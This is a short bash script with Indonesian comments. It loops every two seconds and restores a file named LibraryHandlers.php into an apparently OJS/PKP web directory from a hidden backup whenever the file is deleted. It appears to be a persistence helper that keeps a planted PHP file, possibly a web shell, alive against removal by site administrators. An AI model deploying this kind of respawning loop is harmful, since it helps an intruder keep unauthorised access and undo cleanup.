#!/bin/bash
# restore_esbatu.sh
# Skrip ini akan mengembalikan LibraryHandlers.php jika dihapus

TARGET="/home/tjnpuwnx/public_html/lib/pkp/pages/libraryFiles/LibraryHandlers.php"
BACKUP="/home/tjnpuwnx/backups/LibraryHandlers.php"
LOG="/home/tjnpuwnx/backups/restore_esbatu.log"
SLEEP=2   # cek setiap 2 detik

echo "$(date): restore_esbatu.sh started" >> "$LOG"

while true; do
    if [ ! -f "$TARGET" ]; then
        cp -p "$BACKUP" "$TARGET" && echo "$(date): restored $TARGET" >> "$LOG"
    fi
    sleep "$SLEEP"
done
